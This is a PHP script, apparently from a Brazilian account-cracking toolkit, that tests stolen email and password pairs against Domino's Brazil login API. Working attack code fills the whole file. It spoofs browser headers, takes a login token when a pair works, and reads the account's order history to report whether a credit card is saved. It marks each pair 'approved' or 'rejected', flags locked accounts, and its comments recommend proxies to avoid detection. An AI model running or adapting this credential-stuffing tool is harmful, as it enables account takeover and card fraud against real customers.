<?php
error_reporting(1);
set_time_limit(0);
date_default_timezone_set('America/Sao_Paulo');

function getStr($string, $start, $end) {
    $str = explode($start, $string);
    if (isset($str[1])) {
        $str = explode($end, $str[1]);
        return $str[0];
    }
    return '';
}

function filtrar($query, $value) {
    $dominos = str_replace($query, $query[0], $value);
    $lean7 = explode($query[0], $dominos);
    return $lean7;
}

$ip = $_SERVER['REMOTE_ADDR'];

$string = $_GET['lista'];
$login = filtrar(array(":"), $string)[0];
$senha = filtrar(array(":"), $string)[1];
$lista = ("$login | $senha");

if (!$login || !$senha) {
    exit('<font color="black">#DIE ➜ <span class="badge rounded-pill bg-danger"> [ Informe todos os dados! ] </span> ➜ @1nsaneqy <br>');
}
$tempoC = microtime(true);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api-golo01.dominos.com/as/token.oauth2');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, 
    'grant_type=password' .
    '&validator_id=VoldemortCredValidator' .
    '&client_id=nolo-rm-full' .
    '&scope=customer%3Acard%3Aread+customer%3Aprofile%3Aread%3Aextended+customer%3AorderHistory%3Aread+' .
    'customer%3Acard%3Aupdate+customer%3Aprofile%3Aread%3Abasic+customer%3Aloyalty%3Aread+customer%3AorderHistory%3Aupdate+' .
    'customer%3Acard%3Acreate+customer%3AloyaltyHistory%3Aread+order%3Aplace%3AcardOnFile+customer%3Acard%3Adelete+' .
    'customer%3AorderHistory%3Acreate+customer%3Aprofile%3Aupdate+easyOrder%3AoptInOut+easyOrder%3Aread' .
    '&username=' . $login . 
    '&password=' . $senha
);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: api-golo01.dominos.com',
    'Dpz-Language: pt',
    'Authorization: bm9sby1ybS1mdWxsOg==',
    'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
    'Accept: application/json, text/javascript, */*; q=0.01',
    'Dpz-Market: BRAZIL',
    'X-Dpz-D: f79f2d14-6f8a-49d4-a635-46aafb4bfac4',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4728.0 Safari/537.36',
    'Market: BRAZIL',
    'Origin: https://api-golo01.dominos.com',
    'Referer: https://api-golo01.dominos.com/assets/build/xdomain/proxy.html',
    'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7'
]);
//curl_setopt($ch, CURLOPT_PROXY, ''); PARA MELHOR USO, UTILIZE PROXY.
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, '');  PARA MELHOR USO, UTILIZE PROXY.

$dominos = curl_exec($ch);
$accessToken = getStr($dominos, '"access_token":"', '"');

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://order.golo01.dominos.com/power/customer/6aUggOnZXvgm_8SUMckzaNHcFVHiKpWKX0XOy7-P/order?limit=5&lang=pt&filterDeliveryHotspot=undefined');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: order.golo01.dominos.com',
    'X-Return-Forbidden-Status: true',
    'Dpz-Language: pt',
    'Authorization: Bearer ' . $accessToken,
    'Content-Type: application/json',
    'Accept: application/json, text/javascript, */*; q=0.01',
    'Dpz-Market: BRAZIL',
    'X-Dpz-D: f79f2d14-6f8a-49d4-a635-46aafb4bfac4',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4728.0 Safari/537.36',
    'Market: BRAZIL',
    'Referer: https://order.golo01.dominos.com/assets/build/xdomain/proxy.html',
    'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7'
]);
//curl_setopt($ch, CURLOPT_PROXY, ''); PARA MELHOR USO, UTILIZE PROXY.
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, '');  PARA MELHOR USO, UTILIZE PROXY.

$puxacc = curl_exec($ch);
$creditcard = getStr($puxacc, '"CardType":"', '"');

if (empty($creditcard)) {
    $creditcard = 'No';
} else {
    $creditcard = ucfirst($creditcard);
}

$tempoF = microtime(true);
$tempoTotal = $tempoF - $tempoC;
$segs = number_format($tempoTotal, 2);

if (strpos($dominos, 'Account Locked') !== false) {
    echo '<span class="badge badge-danger">🧨 #Reprovada </span> <font color="white"> » [' . $lista . '] » <span class="badge badge-danger">[Account Locked!] </span> » (' . $segs . 's) #Lean7</span><br>';
} elseif (strpos($dominos, "We didn't recognize the username or password you entered. Please try again.") !== false) {
    echo '<span class="badge badge-danger">🧨 #Reprovada </span> <font color="white"> » [' . $lista . '] » <span class="badge badge-danger">[Email ou senha invalido(s).] </span> » (' . $segs . 's) #Lean7</span><br>';
} elseif (strpos($dominos, '"error_description"') !== false) {
    echo '<span class="badge badge-danger">🧨 #Reprovada </span> <font color="white"> » [' . $lista . '] » <span class="badge badge-danger">[Email ou senha invalido(s).] </span> » (' . $segs . 's) #Lean7</span><br>';
} elseif (strpos($dominos, '"access_token"') !== false) {
    echo '<span class="badge badge-success">✅ #Aprovada </span> <font color="white"> » [' . $lista . '] » [Card: ' . $creditcard . '] » <span class="badge badge-success">[Account Approved - 200] </span > » (' . $segs . 's) #Lean7</span><br>';
}
?>
